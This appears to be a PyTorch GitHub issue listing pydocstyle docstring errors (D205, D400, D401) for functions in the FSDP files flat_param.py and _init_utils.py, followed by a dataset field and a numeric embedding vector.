- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_flat_param_offsets`, **Line**: 1018, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_flat_param_offsets`, **Line**: 1018, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_flat_param_offsets`, **Line**: 1018, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `shard_metadata`, **Line**: 1033, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `shard_metadata`, **Line**: 1033, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `shard_metadata`, **Line**: 1033, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `init_flat_param_attributes`, **Line**: 1070, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `init_flat_param_attributes`, **Line**: 1070, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `pre_unshard`, **Line**: 1156, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_low_precision_shard`, **Line**: 1183, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_low_precision_shard`, **Line**: 1183, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unshard`, **Line**: 1202, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unshard`, **Line**: 1202, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unshard`, **Line**: 1202, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `needs_unshard`, **Line**: 1226, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_alloc_padded_unsharded_flat_param`, **Line**: 1237, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_alloc_padded_unsharded_flat_param`, **Line**: 1237, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_padded_unsharded_flat_param`, **Line**: 1251, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_padded_unsharded_flat_param`, **Line**: 1251, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_padded_unsharded_flat_param`, **Line**: 1251, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_all_gather_flat_param`, **Line**: 1275, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_all_gather_flat_param`, **Line**: 1275, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_flat_param`, **Line**: 1313, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_flat_param`, **Line**: 1313, **Description**: First line should end with a period (not 'a')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_unshard`, **Line**: 1342, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_unshard`, **Line**: 1342, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_unshard`, **Line**: 1342, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unshard_grad`, **Line**: 1367, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unshard_grad`, **Line**: 1367, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_backward`, **Line**: 1429, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_backward`, **Line**: 1429, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_backward`, **Line**: 1429, **Description**: First line should be in imperative mood (perhaps 'Prepare', not 'Prepares')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_optim`, **Line**: 1494, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_optim`, **Line**: 1494, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `prepare_gradient_for_optim`, **Line**: 1494, **Description**: First line should be in imperative mood (perhaps 'Prepare', not 'Prepares')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `to_cpu`, **Line**: 1540, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `to_cpu`, **Line**: 1540, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `to_cpu`, **Line**: 1540, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `reshard`, **Line**: 1587, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `reshard`, **Line**: 1587, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `reshard`, **Line**: 1587, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_reshard`, **Line**: 1603, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_reshard`, **Line**: 1603, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `post_reshard`, **Line**: 1603, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_free_unsharded_flat_param`, **Line**: 1622, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_free_unsharded_flat_param`, **Line**: 1622, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_unaligned`, **Line**: 1688, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_unaligned`, **Line**: 1688, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_unaligned`, **Line**: 1688, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_aligned`, **Line**: 1714, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_aligned`, **Line**: 1714, **Description**: First line should end with a period (not '`')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unflat_views_aligned`, **Line**: 1714, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_views`, **Line**: 1741, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_views`, **Line**: 1741, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_grad_views`, **Line**: 1820, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_unsharded_grad_views`, **Line**: 1820, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unflatten_as_params`, **Line**: 1888, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `unflatten_as_params`, **Line**: 1888, **Description**: First line should end with a period (not ',')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_views`, **Line**: 1903, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_views`, **Line**: 1903, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_views`, **Line**: 1903, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_grad_views`, **Line**: 1958, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_grad_views`, **Line**: 1958, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_use_sharded_grad_views`, **Line**: 1958, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_orig_params`, **Line**: 2018, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_orig_params`, **Line**: 2018, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_orig_params`, **Line**: 2018, **Description**: First line should be in imperative mood (perhaps 'Iterate', not 'Iterates')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_tensor`, **Line**: 2176, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_tensor`, **Line**: 2176, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_writeback_tensor`, **Line**: 2176, **Description**: First line should be in imperative mood (perhaps 'Write', not 'Writes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_clear_grads_if_needed`, **Line**: 2218, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_clear_grads_if_needed`, **Line**: 2218, **Description**: First line should end with a period (not '`')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `flat_param_to`, **Line**: 2245, **Description**: First line should be in imperative mood (perhaps 'Wrap', not 'Wraps')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_modules`, **Line**: 2255, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_modules`, **Line**: 2255, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_modules`, **Line**: 2255, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `is_sharded`, **Line**: 2264, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `is_sharded`, **Line**: 2264, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `is_sharded`, **Line**: 2264, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_reset_is_grad_none`, **Line**: 2350, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_reset_is_grad_none`, **Line**: 2350, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_reset_is_grad_none`, **Line**: 2350, **Description**: First line should be in imperative mood (perhaps 'Reset', not 'Resets')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_intra_node_process_group`, **Line**: 174, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_intra_node_process_group`, **Line**: 174, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_inter_node_process_group`, **Line**: 192, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_inter_node_process_group`, **Line**: 192, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_inter_node_process_group`, **Line**: 192, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_intra_and_inter_node_groups`, **Line**: 227, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_intra_and_inter_node_groups`, **Line**: 227, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_intra_and_inter_node_groups`, **Line**: 227, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_device_handle`, **Line**: 283, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_device_handle`, **Line**: 283, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_device_handle`, **Line**: 283, **Description**: First line should be in imperative mood (perhaps 'Determine', not 'Determines')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_param_handle_from_module`, **Line**: 452, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_param_handle_from_module`, **Line**: 452, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_param_handles_from_module`, **Line**: 499, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_param_handles_from_module`, **Line**: 499, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_init_param_handles_from_module`, **Line**: 499, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_state_names_for_states`, **Line**: 616, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_state_names_for_states`, **Line**: 616, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_state_names_for_states`, **Line**: 616, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_modules`, **Line**: 647, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_modules`, **Line**: 647, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_modules`, **Line**: 647, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_params`, **Line**: 704, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_params`, **Line**: 704, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_ignored_params`, **Line**: 704, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_buffer_names`, **Line**: 733, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_buffer_names`, **Line**: 733, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_buffer_names`, **Line**: 733, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_single_device_module`, **Line**: 746, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_single_device_module`, **Line**: 746, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_single_device_module`, **Line**: 746, **Description**: First line should be in imperative mood (perhaps 'Raise', not 'Raises')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_device_from_device_id`, **Line**: 762, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_device_from_device_id`, **Line**: 762, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_device_from_device_id`, **Line**: 762, **Description**: First line should be in imperative mood (perhaps 'Process', not 'Processes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_need_to_materialize_module`, **Line**: 788, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_need_to_materialize_module`, **Line**: 788, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_need_to_materialize_module`, **Line**: 788, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_move_module_to_device`, **Line**: 841, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_move_module_to_device`, **Line**: 841, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_move_module_to_device`, **Line**: 841, **Description**: First line should be in imperative mood (perhaps 'Move', not 'Moves')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_move_states_to_device`, **Line**: 894, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_move_states_to_device`, **Line**: 894, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_compute_device`, **Line**: 936, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_compute_device`, **Line**: 936, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_compute_device`, **Line**: 936, **Description**: First line should be in imperative mood (perhaps 'Determine', not 'Determines')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_sync_module_params_and_buffers`, **Line**: 972, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_sync_module_params_and_buffers`, **Line**: 972, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_sync_module_params_and_buffers`, **Line**: 972, **Description**: First line should be in imperative mood (perhaps 'Synchronize', not 'Synchronizes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_orig_params`, **Line**: 1031, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_orig_params`, **Line**: 1031, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_get_orig_params`, **Line**: 1031, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_orig_params_flattened`, **Line**: 1051, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_orig_params_flattened`, **Line**: 1051, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/_init_utils.py`, **Entity**: `_check_orig_params_flattened`, **Line**: 1051, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')

cc @carljparker",False,"[-2.72203475e-01 -6.53442502e-01  7.62057379e-02 -4.73891236e-02
  3.67723443e-02 -2.89354265e-01 -2.77367830e-01  7.09014833e-02
 -2.32685685e-01 -1.62191197e-01 -9.65103135e-02 -8.85359794e-02
 -1.59737524e-02  2.70878136e-01  2.52147578e-02  2.75304578e-02
 -2.17136770e-01 -7.09624887e-01  2.03053504e-01  1.56522140e-01
 -2.42835265e-02  3.51058781e-01 -3.02810013e-01  1.52469248e-01
 -5.04552424e-02 -2.31514145e-02 -2.55571514e-01 -1.87397063e-01
  1.58631168e-02 -1.28333539e-01  3.03765416e-01  1.42326236e-01
 -2.87318885e-01  2.57192757e-02  6.12336338e-01  3.37277323e-01
 -8.88913199e-02 -7.20891953e-02  9.51102525e-02 -3.29704359e-02
  8.29143673e-02 -1.42589793e-01 -2.19342530e-01 -2.15755850e-01
 -3.56144384e-02 -3.27730715e-01 -5.10947220e-03  3.92764956e-02
 -3.58849838e-02  1.41716331e-01 -2.57506222e-01  2.02105641e-01
 -1.21104091e-01 -8.25617164e-02  3.07327330e-01 -1.71128482e-01
 -1.16853848e-01  7.29889691e-01 -4.44165152e-03 -3.61403227e-02
 -1.28260870e-02  2.24845022e-01 -4.94308248e-02  2.29889780e-01
 -2.01383442e-01  3.58388990e-01  4.84602563e-02 -1.33562297e-01
  2.05002859e-01 -1.09855764e-01 -2.45731309e-01  5.86075522e-03
 -4.15712625e-01 -1.58240721e-01  3.97766083e-02  4.09118742e-01
 -3.30246747e-01  6.54596239e-02 -4.86160338e-01 -2.30224848e-01
 -3.13099384e-01  1.67220056e-01  3.05545405e-02  3.73920381e-01
  2.21003368e-02 -2.16982350e-01 -6.36856928e-02 -1.09807938e-01
 -9.50706564e-03 -6.02777377e-02  4.03825760e-01 -2.78010964e-04
  5.71620278e-02  4.88488078e-01  7.82367811e-02  1.85917109e-01
  7.96849057e-02  1.74782202e-01  1.59436464e-03 -3.47677499e-01
  1.13193952e-01 -4.16265845e-01 -2.52210796e-01  1.16065145e-01
  7.44333863e-02  7.85565972e-02  1.39623493e-01 -1.14945099e-01
  3.41380715e-01 -1.07068732e-01  1.59826994e-01 -1.71227247e-01
  6.95958659e-02  3.98402661e-02  3.37282419e-01  2.97196031e-01
 -4.00901407e-01 -4.04979847e-02 -2.78458625e-01  3.85951251e-01
 -1.29622102e-01  2.58355260e-01  9.21071395e-02  2.45969892e-02
  1.33947758e-02  4.74110767e-02  3.13548207e-01 -1.20143570e-01
  4.90789339e-02 -1.14349741e-02  1.54625848e-02  2.37853155e-01
 -3.13852429e-01  1.60811394e-01  4.55614746e-01  1.45227328e-01
  2.75973380e-02 -5.37468433e-01  7.27695450e-02 -8.57416838e-02
 -3.26408684e-01 -2.40146443e-01 -3.61602843e-01 -2.96554148e-01
  1.86386943e-01  1.69868469e-01 -1.35976374e-01  9.65079740e-02
 -7.87273273e-02  1.35535404e-01 -4.79573049e-02  1.28164127e-01
 -3.19596887e-01  5.85369527e-01  1.06826045e-01  1.13657072e-01
  4.04999912e-01  1.64273992e-01  3.09410356e-02 -2.24948213e-01
 -8.96482021e-02  1.21782258e-01 -3.17226142e-01  1.82054237e-01
 -3.47957373e-01  1.00048594e-02 -4.37146783e-01 -1.41367525e-01
 -2.02613533e-01 -3.17614734e-01 -3.51726770e-01  2.23410234e-01
  2.93483526e-01 -3.01098734e-01  1.26864254e-01  1.71504289e-01
  1.16923310e-01 -1.74033731e-01 -2.94634346e-02  2.27790624e-01
  1.99208617e-01  6.18983865e-01  6.48742216e-03 -1.37415603e-01
 -2.35318676e-01 -6.62153959e-03  1.84712797e-01 -1.98175281e-01
  4.40125465e-01  5.17877340e-01  1.72770806e-02  1.86880995e-02
  2.26948664e-01  4.53518778e-02 -9.80817601e-02  2.29481936e-01
  3.18557441e-01  3.57970387e-01  1.31889686e-01  3.28747369e-03
 -2.28324398e-01  3.29029322e-01  2.34522402e-01 -1.42508328e-01
 -1.01497144e-01 -2.20823839e-01 -1.62578300e-01 -1.24206021e-01
 -2.81258821e-01 -7.24492148e-02 -1.44522220e-01  1.66162625e-02
  2.94819493e-02 -4.80570227e-01 -2.25428015e-01  6.09498262e-01
  1.55557230e-01 -3.21193665e-01  3.81617486e-01 -1.60850063e-01
 -4.02559042e-01 -7.90571943e-02  2.82012969e-02 -2.11473435e-01
  3.32754642e-01  1.63608432e-01  1.99884214e-02  2.43095964e-01
  1.73240006e-01 -2.69824620e-02  5.18146008e-02 -2.54434466e-01
  7.22626925e-01  8.43586922e-02  8.16971362e-02  6.87095821e-02
  8.98222551e-02 -1.44918948e-01  2.38955453e-01  3.24761719e-01
 -1.64762557e-01 -1.01588517e-01  1.31683439e-01  4.73534614e-02
  5.23483828e-02 -4.25310731e-01 -1.87835678e-01 -7.63459802e-02
 -5.68813443e-01  2.67018437e-01 -7.72431791e-02 -6.95623636e-01
  3.61944363e-02  1.08440779e-02  4.74079728e-01  3.14244986e-01
 -4.20199156e-01 -1.69827744e-01  1.65913165e-01  6.08688928e-02
 -2.89225638e-01  5.11692226e-01 -1.85218126e-01 -4.06582803e-02
  1.32728353e-01 -4.03204799e-01 -2.72177726e-01  1.97557926e-01
 -1.34803772e-01 -6.50853589e-02  3.47356796e-01 -7.48038948e-01
  4.20508891e-01  2.34501794e-01  4.13808793e-01  2.17794806e-01
